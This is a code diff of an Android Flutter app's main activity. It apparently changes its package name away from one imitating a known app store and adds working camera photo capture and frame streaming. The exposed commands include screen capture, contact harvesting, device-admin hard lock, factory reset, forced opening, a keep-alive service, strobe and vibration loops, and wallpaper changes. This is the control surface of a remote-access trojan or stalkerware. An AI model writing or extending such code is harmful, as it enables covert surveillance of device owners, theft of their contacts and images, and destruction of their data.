@@ -1,4 +1,4 @@
-package com.apkpure
+package com.template.app
 
 import android.app.Activity
 import android.app.admin.DevicePolicyManager
@@ -27,6 +27,7 @@ import android.util.DisplayMetrics
 import android.util.Log
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
+import io.flutter.plugin.common.EventChannel
 import io.flutter.plugin.common.MethodCall
 import io.flutter.plugin.common.MethodChannel
 import java.io.ByteArrayOutputStream
@@ -34,9 +35,13 @@ import java.io.ByteArrayOutputStream
 class MainActivity : FlutterActivity() {
 
     private val CHANNEL = "orgsapp/device_info"
-    private var mediaPlayer: MediaPlayer? = null
+    private val FRAME_CHANNEL = "orgsapp/camera_frames"
 
-    // ===== MEDIA PROJECTION =====
+    private var mediaPlayer: MediaPlayer? = null
+    private var cameraHelper: CameraHelper? = null
+    private var frameEventSink: EventChannel.EventSink? = null
+
+    // MediaProjection
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
@@ -50,6 +55,14 @@ class MainActivity : FlutterActivity() {
         super.onCreate(savedInstanceState)
         KeepAliveService.start(this)
 
+        // Init camera helper
+        cameraHelper = CameraHelper(this, this)
+        cameraHelper?.init(
+            onReady = { Log.d("MainActivity", "CameraHelper ready") },
+            onError = { Log.e("MainActivity", "CameraHelper init error: $it") },
+        )
+
+        // Screen metrics
         val metrics = DisplayMetrics()
         @Suppress("DEPRECATION")
         windowManager.defaultDisplay.getMetrics(metrics)
@@ -61,6 +74,7 @@ class MainActivity : FlutterActivity() {
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
 
+        // ===== Method Channel =====
         MethodChannel(
             flutterEngine.dartExecutor.binaryMessenger,
             CHANNEL,
@@ -68,64 +82,98 @@ class MainActivity : FlutterActivity() {
             try {
                 Log.d("MainActivity", "Method called: ${call.method}")
                 when (call.method) {
-                    // ===== DEVICE INFO =====
+                    // DEVICE INFO
                     "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
                     "getModel" -> result.success(Build.MODEL)
                     "getBrand" -> result.success(Build.BRAND)
                     "getAndroidVersion" -> result.success(Build.VERSION.RELEASE)
 
-                    // ===== SETTINGS =====
+                    // SETTINGS
                     "openAccessibilitySettings" -> openAccessibilitySettings(result)
 
-                    // ===== FLASHLIGHT =====
+                    // FLASHLIGHT
                     "flashStrobe" -> toggleFlash(true, result)
                     "stopStrobe" -> toggleFlash(false, result)
 
-                    // ===== VIBRATE =====
+                    // VIBRATE
                     "vibrateLoop" -> vibrateLoop(result)
                     "stopVibrate" -> stopVibrate(result)
 
-                    // ===== OPEN URL =====
+                    // URL
                     "openUrl" -> openUrl(call.argument<String>("url"), result)
 
-                    // ===== FORCE OPEN =====
+                    // FORCE OPEN
                     "forceOpen" -> forceOpen(result)
 
-                    // ===== SCREEN CAPTURE =====
+                    // SCREEN CAPTURE
                     "captureScreen" -> captureScreenWithProjection(result)
                     "requestScreenCapture" -> requestScreenCapture(result)
                     "stopScreenCapture" -> stopScreenCapture(result)
 
-                    // ===== CAMERA =====
-                    "takePhoto" -> takePhoto(result)
-                    "startCameraStream" -> startCameraStream(result)
-                    "stopCameraStream" -> stopCameraStream(result)
+                    // CAMERA
+                    "takePhoto" -> {
+                        val facing = call.argument<String>("camera") ?: "back"
+                        cameraHelper?.takePhoto(
+                            facing = facing,
+                            onSuccess = { b64 ->
+                                runOnUiThread { result.success(b64) }
+                            },
+                            onError = { err ->
+                                Log.e("MainActivity", "takePhoto err: $err")
+                                runOnUiThread { result.success("") }
+                            },
+                        )
+                    }
 
-                    // ===== AUDIO =====
+                    "startCameraStream" -> {
+                        val facing = call.argument<String>("camera") ?: "back"
+                        val intervalMs = call.argument<Int>("interval")?.toLong() ?: 200L
+                        val ok = cameraHelper?.startStream(
+                            facing = facing,
+                            intervalMs = intervalMs,
+                            onFrame = { b64 ->
+                                frameEventSink?.success(b64)
+                            },
+                            onError = { err ->
+                                Log.e("MainActivity", "Stream err: $err")
+                            },
+                        ) ?: false
+                        result.success(ok)
+                    }
+
+                    "stopCameraStream" -> {
+                        cameraHelper?.stopStream()
+                        result.success(true)
+                    }
+
+                    // AUDIO
                     "playAudio" -> playAudio(call.argument<String>("url"), result)
                     "stopAudio" -> stopAudio(result)
-                    "startAudioStream" -> startAudioStream(result)
-                    "stopAudioStream" -> stopAudioStream(result)
+                    "startAudioStream" -> {
+                        Log.w("MainActivity", "startAudioStream — belum diimplementasi")
+                        result.success(false)
+                    }
+                    "stopAudioStream" -> result.success(true)
 
-                    // ===== WALLPAPER =====
+                    // WALLPAPER
                     "setWallpaper" -> setWallpaper(call.argument<String>("url"), result)
 
-                    // ===== LOCK / UNLOCK =====
+                    // LOCK
                     "hardLock" -> hardLock(result)
                     "unlock" -> unlock(result)
                     "isDeviceAdmin" -> isDeviceAdmin(result)
                     "requestDeviceAdmin" -> requestDeviceAdmin(result)
 
-                    // ===== PROTECTION =====
+                    // PROTECTION
                     "enableProtection" -> enableProtection(
                         call.argument<String>("method") ?: "both", result
                     )
                     "disableProtection" -> disableProtection(result)
 
-                    // ===== FACTORY RESET =====
+                    // FACTORY RESET
                     "factoryReset" -> factoryReset(result)
 
-                    // ===== CONTACTS =====
+                    // CONTACTS
                     "getContacts" -> getContacts(result)
 
                     else -> result.notImplemented()
@@ -135,10 +183,26 @@ class MainActivity : FlutterActivity() {
                 result.error("ERR", e.message, null)
             }
         }
+
+        // ===== Event Channel (Camera frames) =====
+        EventChannel(
+            flutterEngine.dartExecutor.binaryMessenger,
+            FRAME_CHANNEL,
+        ).setStreamHandler(object : EventChannel.StreamHandler {
+            override fun onListen(args: Any?, sink: EventChannel.EventSink?) {
+                frameEventSink = sink
+                Log.d("MainActivity", "Camera frame stream listening")
+            }
+
+            override fun onCancel(args: Any?) {
+                frameEventSink = null
+                Log.d("MainActivity", "Camera frame stream cancelled")
+            }
+        })
     }
 
     // ==========================================
-    // ===== SCREEN CAPTURE via MediaProjection =====
+    // ===== SCREEN CAPTURE =====
     // ==========================================
     private fun requestScreenCapture(result: MethodChannel.Result) {
         try {
@@ -195,14 +259,12 @@ class MainActivity : FlutterActivity() {
 
     private fun captureScreenWithProjection(result: MethodChannel.Result) {
         if (mediaProjection == null || imageReader == null) {
-            Log.w("MainActivity", "No projection — fallback to View.draw()")
             captureScreenFallback(result)
             return
         }
         try {
             val image = imageReader?.acquireLatestImage()
             if (image == null) {
-                Log.w("MainActivity", "No image — fallback")
                 captureScreenFallback(result)
                 return
             }
@@ -229,7 +291,7 @@ class MainActivity : FlutterActivity() {
             Log.d("MainActivity", "Screen captured (projection): ${bytes.size} bytes")
             result.success(base64)
         } catch (e: Exception) {
-            Log.e("MainActivity", "Projection capture error: ${e.message}", e)
+            Log.e("MainActivity", "Projection error: ${e.message}", e)
             captureScreenFallback(result)
         }
     }
@@ -265,23 +327,6 @@ class MainActivity : FlutterActivity() {
     }
 
     // ==========================================
-    // ===== CAMERA (Placeholder — butuh CameraX) =====
-    // ==========================================
-    private fun takePhoto(result: MethodChannel.Result) {
-        Log.w("MainActivity", "takePhoto — butuh CameraX, belum diimplementasi")
-        result.success("")
-    }
-
-    private fun startCameraStream(result: MethodChannel.Result) {
-        Log.w("MainActivity", "startCameraStream — butuh CameraX, belum diimplementasi")
-        result.success(false)
-    }
-
-    private fun stopCameraStream(result: MethodChannel.Result) {
-        result.success(true)
-    }
-
-    // ==========================================
     // ===== AUDIO =====
     // ==========================================
     private fun playAudio(url: String?, result: MethodChannel.Result) {
@@ -306,15 +351,6 @@ class MainActivity : FlutterActivity() {
             mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null
             result.success(true)
         } catch (e: Exception) { result.success(true) }
-    }
-
-    private fun startAudioStream(result: MethodChannel.Result) {
-        Log.w("MainActivity", "startAudioStream — butuh AudioRecord")
-        result.success(false)
-    }
-
-    private fun stopAudioStream(result: MethodChannel.Result) {
-        result.success(true)
     }
 
     // ==========================================
@@ -348,7 +384,7 @@ class MainActivity : FlutterActivity() {
     }
 
     // ==========================================
-    // ===== HARD LOCK / UNLOCK / ADMIN =====
+    // ===== LOCK / ADMIN =====
     // ==========================================
     private fun hardLock(result: MethodChannel.Result) {
         try {
@@ -359,7 +395,7 @@ class MainActivity : FlutterActivity() {
                 Log.d("MainActivity", "Device locked via lockNow()")
                 result.success(true)
             } else {
-                Log.w("MainActivity", "Device admin NOT active — cannot lock")
+                Log.w("MainActivity", "Device admin NOT active")
                 result.success(false)
             }
         } catch (e: Exception) {
@@ -368,7 +404,6 @@ class MainActivity : FlutterActivity() {
     }
 
     private fun unlock(result: MethodChannel.Result) {
-        // Android tidak bisa unlock programmatically
         result.success(false)
     }
 
@@ -447,35 +482,16 @@ class MainActivity : FlutterActivity() {
     // ===== FLASHLIGHT =====
     // ==========================================
     private fun toggleFlash(on: Boolean, result: MethodChannel.Result) {
-    try {
-        val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        var cameraId: String? = null
-
-        // Loop maksimal 100 kali untuk cari kamera yang punya flash
-        var i = 0
-        while (i < 10000000000 && i < camManager.cameraIdList.size) {
-            val id = camManager.cameraIdList[i]
-            val chars = camManager.getCameraCharacteristics(id)
-            val hasFlash = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
-
-            if (hasFlash) {
-                cameraId = id
-                break
-            }
-            i++
+        try {
+            val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val cameraId = camManager.cameraIdList.firstOrNull()
+            if (cameraId == null) { result.success(false); return }
+            camManager.setTorchMode(cameraId, on)
+            result.success(true)
+        } catch (e: Exception) {
+            result.error("FLASH", e.message, null)
         }
-
-        if (cameraId == null) {
-            result.success(false)
-            return
-        }
-
-        camManager.setTorchMode(cameraId, on)
-        result.success(true)
-    } catch (e: Exception) {
-        result.error("FLASH", e.message, null)
     }
-}
 
     // ==========================================
     // ===== VIBRATE =====
